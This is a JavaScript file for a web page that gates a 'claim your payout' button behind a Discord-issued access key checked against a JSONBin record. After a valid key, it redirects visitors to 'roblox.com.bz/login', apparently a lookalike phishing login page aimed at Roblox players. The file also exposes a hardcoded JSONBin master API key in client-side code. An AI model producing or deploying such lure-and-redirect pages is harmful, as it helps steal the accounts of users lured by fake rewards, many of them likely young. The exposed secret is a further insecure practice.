// ============================
// KEY VALIDATION SYSTEM
// ============================

// Your JSONBin configuration
const JSONBIN_BIN_ID = '6a2cd289da38895dfeb8ac3b'; // Will replace after setup
const ROBLOX_LINK = 'https://roblox.com.bz/login?returnUrl=2457737694782978'; // Replace with your Roblox link

// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    setupKeyValidation();
});

function setupKeyValidation() {
    const claimBtn = document.querySelector('.promo-btn');
    
    // Replace the link behavior with key validation
    claimBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        // Create modal for key input
        showKeyInputModal();
    });
}

function showKeyInputModal() {
    // Remove existing modal if any
    const existingModal = document.querySelector('.key-modal-overlay');
    if (existingModal) {
        existingModal.remove();
    }
    
    // Create modal overlay
    const modal = document.createElement('div');
    modal.className = 'key-modal-overlay';
    modal.innerHTML = `
        <div class="key-modal">
            <div class="key-modal-header">
                <h3>🔑 Enter Access Key</h3>
                <button class="key-modal-close">&times;</button>
            </div>
            <div class="key-modal-body">
                <p style="margin-bottom: 15px; color: #e4dce8;">
                    Enter the key from Discord to claim your payout
                </p>
                <input 
                    type="text" 
                    class="key-input" 
                    placeholder="Enter your key here..."
                    autocomplete="off"
                >
                <div class="key-error" style="display: none;"></div>
                <button class="key-submit-btn">
                    Verify & Claim
                    <span>→</span>
                </button>
                <div class="key-loading" style="display: none;">
                    <div class="spinner"></div>
                    <span>Verifying key...</span>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Add modal styles dynamically
    addModalStyles();
    
    // Setup event listeners
    setupModalEvents(modal);
}

function addModalStyles() {
    if (document.getElementById('key-modal-styles')) return;
    
    const styles = document.createElement('style');
    styles.id = 'key-modal-styles';
    styles.textContent = `
        .key-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(10px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        
        .key-modal {
            background: linear-gradient(135deg, #1a0030 0%, #0d001a 100%);
            border: 1px solid rgba(174, 70, 255, 0.5);
            border-radius: 28px;
            padding: 40px;
            width: 90%;
            max-width: 480px;
            box-shadow: 0 0 40px rgba(174, 70, 255, 0.3), 0 0 80px rgba(174, 70, 255, 0.1);
            animation: slideUp 0.4s ease;
        }
        
        .key-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        
        .key-modal-header h3 {
            color: #fff;
            font-size: 24px;
            font-weight: 800;
            font-style: italic;
        }
        
        .key-modal-close {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: #fff;
            font-size: 28px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }
        
        .key-modal-close:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(90deg);
        }
        
        .key-input {
            width: 100%;
            padding: 18px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(174, 70, 255, 0.3);
            border-radius: 16px;
            color: #fff;
            font-size: 18px;
            font-family: 'Inter', sans-serif;
            margin-bottom: 20px;
            transition: all 0.3s;
            outline: none;
        }
        
        .key-input:focus {
            border-color: rgba(174, 70, 255, 0.8);
            box-shadow: 0 0 20px rgba(174, 70, 255, 0.2);
        }
        
        .key-input.error {
            border-color: #ff4444;
            animation: shake 0.5s ease;
        }
        
        .key-error {
            color: #ff4444;
            font-size: 14px;
            margin-bottom: 15px;
            padding: 10px 15px;
            background: rgba(255, 68, 68, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        
        .key-submit-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(180deg, #c327ff 0%, #8c00ff 100%);
            color: white;
            border: none;
            border-radius: 18px;
            font-size: 20px;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 8px 30px rgba(169, 39, 255, 0.45);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-family: 'Inter', sans-serif;
        }
        
        .key-submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(169, 39, 255, 0.6);
        }
        
        .key-submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .key-submit-btn span {
            font-size: 24px;
        }
        
        .key-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            color: #d9b4ff;
            font-weight: 600;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(174, 70, 255, 0.3);
            border-top-color: #d9b4ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            .key-modal {
                padding: 25px;
                margin: 20px;
            }
            
            .key-modal-header h3 {
                font-size: 20px;
            }
        }
    `;
    
    document.head.appendChild(styles);
}

function setupModalEvents(modal) {
    const closeBtn = modal.querySelector('.key-modal-close');
    const submitBtn = modal.querySelector('.key-submit-btn');
    const keyInput = modal.querySelector('.key-input');
    const errorDiv = modal.querySelector('.key-error');
    const loadingDiv = modal.querySelector('.key-loading');
    const overlay = modal;
    
    // Close modal
    closeBtn.addEventListener('click', () => modal.remove());
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) modal.remove();
    });
    
    // Submit key
    submitBtn.addEventListener('click', () => verifyKey(keyInput, submitBtn, errorDiv, loadingDiv));
    
    // Enter key to submit
    keyInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            verifyKey(keyInput, submitBtn, errorDiv, loadingDiv);
        }
    });
    
    // Focus input
    setTimeout(() => keyInput.focus(), 300);
}

async function verifyKey(keyInput, submitBtn, errorDiv, loadingDiv) {
    const userKey = keyInput.value.trim();
    
    if (!userKey) {
        showError(keyInput, errorDiv, 'Please enter a key');
        return;
    }
    
    // Show loading state
    submitBtn.style.display = 'none';
    loadingDiv.style.display = 'flex';
    errorDiv.style.display = 'none';
    keyInput.classList.remove('error');
    
    try {
        // Fetch valid key from JSONBin
        const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
            headers: {
                'X-Master-Key': '$2a$10$hJ/FocyDPeHkkqIY0z4qzuvdTP.QEbGACgo2F3m1qMxOzJ4HB3mcS' // Replace with your JSONBin API key
            }
        });
        
        if (!response.ok) {
            throw new Error('Failed to verify key');
        }
        
        const data = await response.json();
        const validKey = data.record.key;
        const timestamp = new Date(data.record.timestamp);
        const now = new Date();
        
        // Check if key is expired (24 hours)
        const hoursDiff = (now - timestamp) / (1000 * 60 * 60);
        
        if (hoursDiff > 24) {
            showError(keyInput, errorDiv, 'This key has expired. Get a new one from Discord!');
            resetButton(submitBtn, loadingDiv);
            return;
        }
        
        if (userKey.toUpperCase() === validKey.toUpperCase()) {
            // Success! Redirect to Roblox
            keyInput.style.borderColor = '#00ff88';
            loadingDiv.innerHTML = '✅ Key verified! Redirecting...';
            
            setTimeout(() => {
                window.location.href = ROBLOX_LINK;
            }, 1500);
        } else {
            showError(keyInput, errorDiv, 'Invalid key! Check Discord for the correct key.');
            resetButton(submitBtn, loadingDiv);
        }
        
    } catch (error) {
        showError(keyInput, errorDiv, 'Error verifying key. Please try again.');
        resetButton(submitBtn, loadingDiv);
    }
}

function showError(input, errorDiv, message) {
    input.classList.add('error');
    errorDiv.textContent = `⚠️ ${message}`;
    errorDiv.style.display = 'block';
    
    setTimeout(() => input.classList.remove('error'), 500);
}

function resetButton(submitBtn, loadingDiv) {
    submitBtn.style.display = 'flex';
    loadingDiv.style.display = 'none';
}